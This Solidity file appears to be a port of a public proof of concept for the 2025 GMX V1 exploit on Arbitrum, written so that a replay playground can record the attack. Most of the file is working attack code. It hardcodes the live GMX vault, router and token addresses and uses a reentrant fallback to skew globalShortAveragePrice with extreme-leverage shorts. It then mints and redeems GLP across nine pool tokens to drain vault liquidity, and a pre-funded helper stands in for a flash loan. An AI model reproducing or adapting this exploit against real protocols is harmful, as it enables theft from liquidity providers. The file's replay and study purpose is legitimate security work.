// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

// Synthetic standalone exploit for the EVM Playground (2025-07-gmx).
// The DeFiHackLabs PoC runs the whole attack as the Foundry test contract ITSELF
// (ContractTest is the GMX position owner, implements `fallback()` and
// `gmxPositionCallback(...)` as GMX's reentrant hooks — there is no separate
// standalone exploit contract). This file is a faithful, self-contained copy of
// ContractTest's position-holder logic (createOpenETHPosition / createCloseETHPosition /
// fallback / gmxPositionCallback / profitAttack + getProfitForXXX), so the
// playground can deploy it and record the attack. Logic and constants are copied
// verbatim from test/gmx_exp.sol, with two additive changes required because the
// Foundry-only pieces of the original test cannot run under a plain EVM replay:
//
//   1. `vm.startPrank(orderBookKeeper_/routerPositionKeeper_)` calls (impersonating
//      GMX's keepers to call executeIncreaseOrder/executeDecreaseOrder/
//      setPricesWithBitsAndExecute) are NOT ported here — the config's `callScript`
//      makes those calls directly with the matching `caller`, mirroring vm.prank.
//   2. `deal(address(usdc_), address(this), 7_538_567_619570)` inside profitAttack()
//      (the test's stand-in for a real flash loan an attacker would source from
//      Aave/Balancer) is replaced by `stash.sweep(usdc)` — the FlashStash helper
//      below is pre-funded with the same amount via the config's `setup.dealToken`
//      step, so the funds land in this contract at the exact same point in the
//      reentrant call stack that the original test's cheatcode did.
//
// Root cause (GMX V1 fork, Arbitrum): Vault.increasePosition/decreasePosition can
// be called directly by the position owner (not just through the Router), so the
// exploit repeatedly opens and closes a near-zero-collateral, extreme-leverage BTC
// short position — each open/close cycle skews globalShortAveragePrice further via
// GMX's weighted-average formula. Because GLP's AUM (getAumInUsdg) prices open
// short interest using that same manipulated globalShortAveragePrice, the attacker
// then mints GLP at an artificially cheap/expensive price and redeems it across GMX's
// whole basket of pool tokens (WETH/BTC/USDC/USDe/LINK/UNI/USDT/FRAX/DAI) for a profit
// far exceeding what was deposited, draining most of the vault's liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IRewardRouterV2 {
    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp)
        external
        returns (uint256);
    function unstakeAndRedeemGlp(address _tokenOut, uint256 _glpAmount, uint256 _minOut, address _receiver)
        external
        returns (uint256);
}

interface IGMXPositionRouter {
    function createDecreasePosition(
        address[] memory _path,
        address _indexToken,
        uint256 _collateralDelta,
        uint256 _sizeDelta,
        bool _isLong,
        address _receiver,
        uint256 _acceptablePrice,
        uint256 _minOut,
        uint256 _executionFee,
        bool _withdrawETH,
        address _callbackTarget
    ) external payable returns (bytes32);
}

interface IGMXOrderBook {
    function createIncreaseOrder(
        address[] memory _path,
        uint256 _amountIn,
        address _indexToken,
        uint256 _minOut,
        uint256 _sizeDelta,
        address _collateralToken,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold,
        uint256 _executionFee,
        bool _shouldWrap
    ) external payable;

    function createDecreaseOrder(
        address _indexToken,
        uint256 _sizeDelta,
        address _collateralToken,
        uint256 _collateralDelta,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold
    ) external payable;
}

interface IGMXRouter {
    function approvePlugin(address _plugin) external;
}

interface IGMXVault {
    function getPosition(address _account, address _collateralToken, address _indexToken, bool _isLong)
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256, bool, uint256);
    function increasePosition(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _sizeDelta,
        bool _isLong
    ) external;
    function decreasePosition(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _collateralDelta,
        uint256 _sizeDelta,
        bool _isLong,
        address _receiver
    ) external returns (uint256);
    function poolAmounts(address _token) external view returns (uint256);
    function reservedAmounts(address _token) external view returns (uint256);
    function getMaxPrice(address _token) external view returns (uint256);
}

interface IGMXGlpManager {
    function getAumInUsdg(bool _maximise) external view returns (uint256);
}

// Trivial stand-in for a real flash loan. Pre-funded by the config's
// `setup.dealToken` step with the exact amount the original test conjures via
// `deal(usdc, address(this), 7_538_567_619570)` inside profitAttack() — an
// attacker would source this from Aave/Balancer on mainnet; DeFiHackLabs uses the
// cheatcode shortcut instead. GMXExploit.sweep()s it in at the same call-stack
// point the original deal() fired.
contract FlashStash {
    function sweep(address token) external {
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}

contract GMXExploit {
    IGMXOrderBook constant orderBook_ = IGMXOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);
    IGMXVault constant vault_ = IGMXVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    IGMXRouter constant router_ = IGMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
    IGMXPositionRouter constant positionRouter_ = IGMXPositionRouter(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);
    IRewardRouterV2 constant rewardRouterV2_ = IRewardRouterV2(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);
    IGMXGlpManager constant glp_manager_ = IGMXGlpManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);

    IERC20 constant gmx_lp_token_ = IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);
    IERC20 constant weth_ = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant btc_ = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 constant usdc_ = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 constant usde_ = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant link_ = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
    IERC20 constant uni_ = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 constant usdt_ = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 constant frax_ = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    IERC20 constant dai_ = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    FlashStash public immutable stash;
    bool public isProfit;

    constructor(address stash_) {
        stash = FlashStash(stash_);
        // Mirrors ContractTest.setUp()'s plugin/token approvals.
        router_.approvePlugin(address(orderBook_));
        router_.approvePlugin(address(positionRouter_));
        usdc_.approve(address(rewardRouterV2_), type(uint256).max);
        usdc_.approve(address(glp_manager_), type(uint256).max);
        frax_.approve(address(rewardRouterV2_), type(uint256).max);
        frax_.approve(address(glp_manager_), type(uint256).max);
    }

    // Funds this contract's native balance via a real function selector (NOT
    // empty calldata) so it never dispatches to fallback() — mirrors
    // ContractTest.setUp()'s `vm.deal(address(this), 2 ether)` without
    // accidentally firing the reentrancy hook below.
    function fund() external payable {}

    // https://arbiscan.io/tx/0x0b8cd648fb585bc3d421fc02150013eab79e211ef8d1c68100f2820ce90a4712
    function createOpenETHPosition() external {
        address[] memory path = new address[](1);
        path[0] = address(weth_);
        orderBook_.createIncreaseOrder{value: 0.1003 ether}(
            path,
            100000000000000000, // amountIn
            address(weth_), // indexToken
            0, // minOut
            531064000000000000000000000000000, // sizeDelta, 2.003x leverage
            address(weth_), // collateralToken
            true, // isLong
            1500000000000000000000000000000000, // triggerPrice
            true, // triggerAboveThreshold
            300000000000000, // executionFee = minExecutionFee() * 3
            true // shouldWrap
        );
    }

    // https://app.blocksec.com/explorer/tx/arbitrum/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af
    function createCloseETHPosition() public {
        (uint256 size, uint256 collateral,,,,,,) =
            vault_.getPosition(address(this), address(weth_), address(weth_), true);
        orderBook_.createDecreaseOrder{value: 300000000000000}(
            address(weth_),
            size / 2,
            address(weth_),
            collateral / 2,
            true,
            1500000000000000000000000000000000,
            true
        );
    }

    // Mirrors `isProfit = true;` in testExploit() — flips the fallback() branch
    // taken on the NEXT reentrant ETH refund.
    function setProfit() external {
        isProfit = true;
    }

    // Key point: globalShortAveragePrice has already been changed. This is GMX's
    // callback function, called when a market order is closed.
    function gmxPositionCallback(bytes32, bool, bool) external {
        createCloseETHPosition();
    }

    // Called when closing an ETH position — this is the critical reentrancy point.
    fallback() external payable {
        if (isProfit) {
            profitAttack();
        } else {
            usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
            vault_.increasePosition(
                address(this), address(usdc_), address(btc_), 90030000000000000000000000000000000, false
            );
            address[] memory path = new address[](1);
            path[0] = address(usdc_);
            positionRouter_.createDecreasePosition{value: 3000000000000000}(
                path,
                address(btc_),
                0,
                90030000000000000000000000000000000,
                false,
                address(this),
                120000000000000000000000000000000000,
                0,
                3000000000000000,
                false,
                address(this)
            );
        }
    }

    // https://app.blocksec.com/explorer/tx/arbitrum/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef
    function profitAttack() internal {
        // "flashloan" the war chest (see FlashStash docstring above)
        stash.sweep(address(usdc_));
        rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6000000000000, 0, 0);
        usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));

        vault_.increasePosition(
            address(this), address(usdc_), address(btc_), 15385676195700000000000000000000000000, false
        );
        getProfitForETH();
        getProfitForBTC();
        getProfitForUSDC();
        getProfitForUSDE();
        getProfitForLINK();
        getProfitForUNI();
        getProfitForUSDT();
        getProfitForFRAX();
        getProfitForDAI();
        vault_.decreasePosition(
            address(this),
            address(usdc_),
            address(btc_),
            0,
            15385676195700000000000000000000000000,
            false,
            address(this)
        );

        for (uint256 i = 0; i < 10; i++) {
            rewardRouterV2_.mintAndStakeGlp(address(frax_), 9000000000000000000000000, 0, 0);
            usdc_.transfer(address(vault_), 500000000000);
            vault_.increasePosition(
                address(this), address(usdc_), address(btc_), 12500000000000000000000000000000000000, false
            );
            getProfitForFRAX();
            vault_.decreasePosition(
                address(this),
                address(usdc_),
                address(btc_),
                0,
                12500000000000000000000000000000000000,
                false,
                address(this)
            );
        }
        getProfitForUSDC();
        usdc_.transfer(address(1), 7_538_567_619570); // repay flashloan
    }

    function getProfitForETH() internal {
        uint256 profit_delta = vault_.poolAmounts(address(weth_)) - vault_.reservedAmounts(address(weth_));
        uint256 price = vault_.getMaxPrice(address(weth_));
        uint256 usdgAmount = profit_delta * price / (10 ** weth_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(weth_), glpAmount, 0, address(this));
    }

    function getProfitForBTC() internal {
        uint256 profit_delta = vault_.poolAmounts(address(btc_)) - vault_.reservedAmounts(address(btc_));
        uint256 price = vault_.getMaxPrice(address(btc_));
        uint256 usdgAmount = profit_delta * price / (10 ** btc_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(btc_), glpAmount, 0, address(this));
    }

    function getProfitForUSDC() internal {
        uint256 profit_delta = vault_.poolAmounts(address(usdc_)) - vault_.reservedAmounts(address(usdc_));
        uint256 price = vault_.getMaxPrice(address(usdc_));
        uint256 usdgAmount = profit_delta * price / (10 ** usdc_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(usdc_), glpAmount, 0, address(this));
    }

    function getProfitForUSDE() internal {
        uint256 profit_delta = vault_.poolAmounts(address(usde_)) - vault_.reservedAmounts(address(usde_));
        uint256 price = vault_.getMaxPrice(address(usde_));
        uint256 usdgAmount = profit_delta * price / (10 ** usde_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(usde_), glpAmount, 0, address(this));
    }

    function getProfitForLINK() internal {
        uint256 profit_delta = vault_.poolAmounts(address(link_)) - vault_.reservedAmounts(address(link_));
        uint256 price = vault_.getMaxPrice(address(link_));
        uint256 usdgAmount = profit_delta * price / (10 ** link_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(link_), glpAmount, 0, address(this));
    }

    function getProfitForUNI() internal {
        uint256 profit_delta = vault_.poolAmounts(address(uni_)) - vault_.reservedAmounts(address(uni_));
        uint256 price = vault_.getMaxPrice(address(uni_));
        uint256 usdgAmount = profit_delta * price / (10 ** uni_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(uni_), glpAmount, 0, address(this));
    }

    function getProfitForUSDT() internal {
        uint256 profit_delta = vault_.poolAmounts(address(usdt_)) - vault_.reservedAmounts(address(usdt_));
        uint256 price = vault_.getMaxPrice(address(usdt_));
        uint256 usdgAmount = profit_delta * price / (10 ** usdt_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(usdt_), glpAmount, 0, address(this));
    }

    function getProfitForFRAX() internal {
        uint256 profit_delta = vault_.poolAmounts(address(frax_)) - vault_.reservedAmounts(address(frax_));
        uint256 price = vault_.getMaxPrice(address(frax_));
        uint256 usdgAmount = profit_delta * price / (10 ** frax_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(frax_), glpAmount, 0, address(this));
    }

    function getProfitForDAI() internal {
        uint256 profit_delta = vault_.poolAmounts(address(dai_)) - vault_.reservedAmounts(address(dai_));
        uint256 price = vault_.getMaxPrice(address(dai_));
        uint256 usdgAmount = profit_delta * price / (10 ** dai_.decimals()) / 1e12;
        uint256 glpAmount = usdgAmount * gmx_lp_token_.totalSupply() / glp_manager_.getAumInUsdg(false);
        rewardRouterV2_.unstakeAndRedeemGlp(address(dai_), glpAmount, 0, address(this));
    }
}
